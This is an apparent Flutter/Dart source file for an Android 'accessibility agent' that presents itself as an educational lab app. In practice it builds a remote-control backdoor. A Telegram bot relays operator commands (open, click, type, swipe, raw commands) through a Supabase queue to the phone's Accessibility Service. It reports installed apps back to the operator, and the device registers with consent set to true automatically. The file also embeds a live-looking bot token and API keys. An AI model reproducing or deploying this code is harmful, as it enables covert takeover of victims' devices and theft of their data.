import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:http/http.dart' as http;

// local modules
import 'core/device_agent.dart';

// --- CONFIG: update these with your real values ---
const String TELEGRAM_BOT_TOKEN = '8038108668:AAH305YgYpdMJsy3PsanQpawXAbNTj-YwPo';
const int TELEGRAM_POLL_INTERVAL_SECONDS = 2; // poll Telegram for updates
const int HEARTBEAT_INTERVAL_SECONDS = 30; // device heartbeat interval

// Supabase project public values (SAFE to include in app)
// NOTE: do NOT include service_role key in the APK.
const String SUPABASE_PROJECT_URL = 'https://pbovhvhpewnooofaeybe.supabase.co';
const String SUPABASE_ANON_KEY = 'sb_publishable_3ogCBf5gvYZqIA7074Tz2A_64hEs13h';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Supabase.initialize(
    url: SUPABASE_PROJECT_URL,
    anonKey: SUPABASE_ANON_KEY,
  );

  runApp(const CyberAgentApp());
}

class CyberAgentApp extends StatelessWidget {
  const CyberAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Cyber Accessibility Agent',
      debugShowCheckedModeBanner: false,
      home: const ConsentPage(),
    );
  }
}

class ConsentPage extends StatefulWidget {
  const ConsentPage({super.key});

  @override
  State<ConsentPage> createState() => _ConsentPageState();
}

class _ConsentPageState extends State<ConsentPage> {
  String _status = 'Initializing...';

  @override
  void initState() {
    super.initState();
    // Start background services once the UI is up
    Future.microtask(() async {
      // initialize Telegram + Supabase manager (keeps Telegram polling & heartbeat)
      await TelegramSupabaseManager.instance.init();

      // Configure DeviceAgent (no secret keys in APK)
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_PROJECT_URL,
        anonKey: SUPABASE_ANON_KEY,
        deviceId: null,
        deviceJwt: null,
        pollInterval: const Duration(seconds: 5),
      );

      // If no stored device credentials, register via edge function and persist them.
      try {
        // generate a reasonably unique device id (or change to a fixed id if you prefer)
        final generatedId = 'device_${DateTime.now().millisecondsSinceEpoch}';

        final reg = await DeviceAgent.instance.registerDeviceViaEdge(
          registerUri: Uri.parse('$SUPABASE_PROJECT_URL/functions/v1/register-device'),
          requestedId: generatedId,
          displayName: 'CyberAgent ${DateTime.now().year}',
          consent: true,
          metadata: {'model': 'test-device', 'os': 'android'},
        );

        if (reg != null) {
          print('[ConsentPage] registered device: ${reg['device_id']}');
          setState(() => _status = 'Registered device ${reg['device_id']} — starting agent...');
        } else {
          // may already exist or failed: DeviceAgent will check stored prefs
          print('[ConsentPage] register-device returned null (maybe already registered)');
          setState(() => _status = 'Using existing device credentials (if any). Starting agent...');
        }
      } catch (e) {
        print('[ConsentPage] register-device call failed: $e');
        setState(() => _status = 'Register failed (see logs) — starting agent anyway if credentials exist');
      }

      // Start polling for commands (requires deviceId + deviceJwt to be present in prefs or returned above)
      await DeviceAgent.instance.start();

      setState(() => _status = 'Bot running. DeviceAgent started. Use /start in Telegram to begin.');
    });
  }

  @override
  void dispose() {
    // make sure to stop device agent when widget disposed
    DeviceAgent.instance.stop();
    TelegramSupabaseManager.instance.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Accessibility Agent'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Educational Notice',
              style: TextStyle(
                fontSize: 20,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 12),
            const Text(
              'This application uses Android Accessibility Service '
              'to demonstrate automation techniques in a controlled '
              'cyber security lab environment.\n\n'
              'To proceed:\n'
              '1. Open Android Settings\n'
              '2. Navigate to Accessibility\n'
              '3. Enable "Cyber Accessibility Agent"\n\n'
              'Once enabled, this app will listen for automation '
              'commands as part of the lab exercise.',
              style: TextStyle(fontSize: 15),
            ),
            const SizedBox(height: 24),
            const Text(
              '⚠️ This app is for educational use only.',
              style: TextStyle(
                color: Colors.red,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 24),
            Text('Service status: $_status'),
            const SizedBox(height: 8),
            const Text(
                'Notes:\n- TELEGRAM_BOT_TOKEN is configured above.\n- Ensure http & shared_preferences are in pubspec.yaml.\n- DeviceAgent will register the device (if needed) and poll device_commands table.'),
          ],
        ),
      ),
    );
  }
}

// -----------------------------------------------------------------------------
// Manager: Telegram polling + Supabase helpers + global heartbeat
// -----------------------------------------------------------------------------

class TelegramSupabaseManager {
  TelegramSupabaseManager._private();
  static final TelegramSupabaseManager instance = TelegramSupabaseManager._private();

  final SupabaseClient _supabase = Supabase.instance.client;

  // Telegram polling
  int _tgOffset = 0;
  Timer? _tgPollTimer;

  // Heartbeat timer for checking all devices
  Timer? _heartbeatTimer;

  // In-memory maps
  final Map<int, String?> _activeDeviceByChat = {}; // chatId -> deviceId
  final Set<int> _subscribedChats = {}; // chats that want notifications
  final Map<String, bool> _lastStatus = {}; // deviceId -> online

  // init
  Future<void> init() async {
    // start polling Telegram
    if (TELEGRAM_BOT_TOKEN == 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
      print('⚠️ Please set TELEGRAM_BOT_TOKEN in main.dart');
    }

    _startTelegramPolling();

    // start global heartbeat
    _startGlobalHeartbeat();
  }

  // ---------------------------------------------------------------------------
  // Telegram HTTP helpers
  // ---------------------------------------------------------------------------
  Uri _tgUrl(String method) => Uri.parse('https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/$method');

  Future<void> _sendTelegramMessage(int chatId, String text) async {
    try {
      final res = await http.post(_tgUrl('sendMessage'), body: {
        'chat_id': chatId.toString(),
        'text': text,
        'parse_mode': 'Markdown',
      });

      if (res.statusCode != 200) {
        print('Telegram sendMessage failed: ${res.body}');
      }
    } catch (e) {
      print('Telegram send error: $e');
    }
  }

  void _startTelegramPolling() {
    _tgPollTimer?.cancel();
    _tgPollTimer = Timer.periodic(const Duration(seconds: TELEGRAM_POLL_INTERVAL_SECONDS), (_) async {
      await _pollUpdates();
    });
  }

  Future<void> _pollUpdates() async {
    try {
      final res = await http.get(_tgUrl('getUpdates?timeout=0&offset=$_tgOffset'));
      if (res.statusCode != 200) return;
      final data = json.decode(res.body);
      if (data == null || data['result'] == null) return;

      for (final update in data['result']) {
        _tgOffset = (update['update_id'] as int) + 1;
        await _handleUpdate(update);
      }
    } catch (e) {
      print('Error polling Telegram: $e');
    }
  }

  Future<void> _handleUpdate(dynamic update) async {
    final message = update['message'] ?? update['edited_message'];
    if (message == null) return;

    final chat = message['chat'];
    final chatId = chat['id'] as int;
    final text = (message['text'] ?? '').toString().trim();

    if (text.isEmpty) return;

    print('TG msg from $chatId: $text');

    // Commands parsing
    if (text == '/start') {
      _subscribedChats.add(chatId);
      await _sendTelegramMessage(chatId, 'Welcome! You are subscribed to device notifications. Use /devices to list devices.');
      return;
    }

    if (text == '/stop') {
      _subscribedChats.remove(chatId);
      _activeDeviceByChat.remove(chatId);
      await _sendTelegramMessage(chatId, 'You have been unsubscribed and active session cleared.');
      return;
    }

    if (text == '/devices') {
      final devices = await getDevices();
      if (devices.isEmpty) {
        await _sendTelegramMessage(chatId, 'No devices found.');
      } else {
        final msg = devices.map((d) => '${d['id']} - ${d['online'] == true ? 'online ✅' : 'offline ❌'}').join('\n');
        await _sendTelegramMessage(chatId, msg);
      }
      return;
    }

    if (text.startsWith('/use ')) {
      final parts = text.split(' ');
      if (parts.length >= 2) {
        final deviceId = parts[1];
        _activeDeviceByChat[chatId] = deviceId;
        await _sendTelegramMessage(chatId, 'Device `$deviceId` active session. All commands will go to this device.');
      } else {
        await _sendTelegramMessage(chatId, 'Usage: /use <device_id>');
      }
      return;
    }

    if (text == '/apps') {
      final activeDevice = _activeDeviceByChat[chatId];
      if (activeDevice == null) {
        await _sendTelegramMessage(chatId, 'Select a device first with /use <device_id>');
        return;
      }
      final apps = await getInstalledApps(activeDevice);
      final msg = apps.isEmpty ? 'No apps found on $activeDevice' : 'Installed apps on $activeDevice:\n' + apps.join('\n');
      await _sendTelegramMessage(chatId, msg);
      return;
    }

    // WHOAMI: device info after /use
    if (text == '/whoami') {
      final activeDevice = _activeDeviceByChat[chatId];
      if (activeDevice == null) {
        await _sendTelegramMessage(chatId, 'Select a device first with /use <device_id>');
        return;
      }
      final info = await getDevice(activeDevice);
      if (info == null) {
        await _sendTelegramMessage(chatId, 'Device $activeDevice not found.');
        return;
      }
      final apps = await getInstalledApps(activeDevice);
      final recent = await getRecentCommands(activeDevice, limit: 5);
      final sb = StringBuffer();
      sb.writeln('*Device:* `${info['id']}`');
      sb.writeln('*Online:* ${info['online'] == true ? 'Yes ✅' : 'No ❌'}');
      sb.writeln('*Consent:* ${info['consent'] == true || info['consent'] == 'true' ? 'Granted' : 'Not granted'}');
      sb.writeln('*Installed apps (count):* ${apps.length}');
      if (recent.isNotEmpty) {
        sb.writeln('\\n*Recent commands:*');
        for (final r in recent) {
          sb.writeln('- ${r['command']} (${r['status'] ?? 'unknown'})');
        }
      }
      await _sendTelegramMessage(chatId, sb.toString());
      return;
    }

    // These commands are forwarded to device_commands table
    // Allowed quick commands: /select <app>, /open <app>, /show ui, /click <option>, /longclick <option>, /swipe <dir>, /type <text>, /back, /home, /recent
    final quickPatterns = <RegExp>[
      RegExp(r'^/select', caseSensitive: false),
      RegExp(r'^/open', caseSensitive: false),
      RegExp(r'^/show', caseSensitive: false),
      RegExp(r'^/click', caseSensitive: false),
      RegExp(r'^/longclick', caseSensitive: false),
      RegExp(r'^/swipe', caseSensitive: false),
      RegExp(r'^/type', caseSensitive: false),
      RegExp(r'^/back', caseSensitive: false),
      RegExp(r'^/home', caseSensitive: false),
      RegExp(r'^/recent', caseSensitive: false),
    ];
    final isQuick = quickPatterns.any((rg) => rg.hasMatch(text));

    if (isQuick) {
      final activeDevice = _activeDeviceByChat[chatId];
      if (activeDevice == null) {
        await _sendTelegramMessage(chatId, 'Select a device first with /use <device_id>');
        return;
      }

      // For /recent we return recent commands locally instead of queuing
      if (RegExp(r'^/recent', caseSensitive: false).hasMatch(text)) {
        final recent = await getRecentCommands(activeDevice, limit: 10);
        if (recent.isEmpty) {
          await _sendTelegramMessage(chatId, 'No recent commands for $activeDevice');
        } else {
          final lines = recent.map((r) => '${r['created_at']}: ${r['command']} (${r['status']})').join('\n');
          await _sendTelegramMessage(chatId, 'Recent commands for $activeDevice:\n$lines');
        }
        return;
      }

      // send command to DB
      await sendCommand(activeDevice, text);

      // Try to check online status and inform user
      final dev = await getDevice(activeDevice);
      final isOnline = dev != null && dev['online'] == true;
      final consent = dev != null && (dev['consent'] == true || dev['consent'] == 'true');

      if (!consent) {
        await _sendTelegramMessage(chatId,
            'Command queued but device `$activeDevice` has no consent flag. Set `consent=true` in device row to allow execution.');
      } else if (!isOnline) {
        await _sendTelegramMessage(chatId, 'Command queued for `$activeDevice`. Device appears offline — it will execute when it comes online.');
      } else {
        await _sendTelegramMessage(chatId, 'Command sent to `$activeDevice`: $text');
      }

      return;
    }

    // If user types anything else and there is an active device, forward as raw command
    final activeDevice = _activeDeviceByChat[chatId];
    if (activeDevice != null) {
      await sendCommand(activeDevice, text);
      await _sendTelegramMessage(chatId, 'Raw command queued for `$activeDevice`: $text');
    } else {
      await _sendTelegramMessage(chatId, 'Unknown command. Use /devices, /use <id>, /apps, /whoami, or send a command after selecting a device.');
    }
  }

  // ---------------------------------------------------------------------------
  // Supabase helpers
  // ---------------------------------------------------------------------------

  Future<List<Map<String, dynamic>>> getDevices() async {
    try {
      final data = await _supabase.from('devices').select('id,online');
      if (data == null) return [];
      return List<Map<String, dynamic>>.from((data as List));
    } catch (e) {
      print('[Supabase] getDevices error: $e');
      return [];
    }
  }

  Future<Map<String, dynamic>?> getDevice(String deviceId) async {
    try {
      final data = await _supabase.from('devices').select('id,online,consent').eq('id', deviceId).maybeSingle();
      if (data == null) return null;
      return Map<String, dynamic>.from((data as Map));
    } catch (e) {
      print('[Supabase] getDevice error: $e');
      return null;
    }
  }

  Future<List<String>> getInstalledApps(String deviceId) async {
    try {
      final data = await _supabase.from('installed_apps').select('app_name').eq('device_id', deviceId);
      if (data == null) return [];
      final rows = List<Map<String, dynamic>>.from((data as List));
      return rows.map((r) => r['app_name'].toString()).toList();
    } catch (e) {
      print('[Supabase] getInstalledApps error: $e');
      return [];
    }
  }

  Future<List<Map<String, dynamic>>> getRecentCommands(String deviceId, {int limit = 5}) async {
    try {
      final data = await _supabase
          .from('device_commands')
          .select('command,status,created_at')
          .eq('device_id', deviceId)
          .order('created_at', ascending: false)
          .limit(limit);
      if (data == null) return [];
      return List<Map<String, dynamic>>.from((data as List));
    } catch (e) {
      print('[Supabase] getRecentCommands error: $e');
      return [];
    }
  }

  Future<void> sendCommand(String deviceId, String command) async {
    try {
      await _supabase.from('device_commands').insert({
        'device_id': deviceId,
        'command': command,
        'status': 'pending',
        'created_at': DateTime.now().toIso8601String(),
      });
    } catch (e) {
      print('[Supabase] sendCommand error: $e');
    }
  }

  // ---------------------------------------------------------------------------
  // Heartbeat: poll devices table every HEARTBEAT_INTERVAL_SECONDS and notify subscribed chats
  // ---------------------------------------------------------------------------
  void _startGlobalHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS), (_) async {
      try {
        final data = await _supabase.from('devices').select('id,online');
        if (data == null) return;
        final devices = List<Map<String, dynamic>>.from((data as List));

        for (final d in devices) {
          final id = d['id'].toString();
          final online = d['online'] == true;

          if (_lastStatus[id] == null || _lastStatus[id] != online) {
            // status changed
            _lastStatus[id] = online;

            // notify all subscribed chats about status change
            for (final chatId in _subscribedChats) {
              final msg = online ? 'Device `$id` online ✅' : 'Device `$id` offline ❌';
              // send without awaiting to avoid blocking loop
              _sendTelegramMessage(chatId, msg);
            }
          }
        }
      } catch (e) {
        print('Heartbeat error: $e');
      }
    });
  }

  // ---------------------------------------------------------------------------
  // Clean up
  // ---------------------------------------------------------------------------
  void dispose() {
    _tgPollTimer?.cancel();
    _heartbeatTimer?.cancel();
  }
}

// -----------------------------------------------------------------------------
// End of file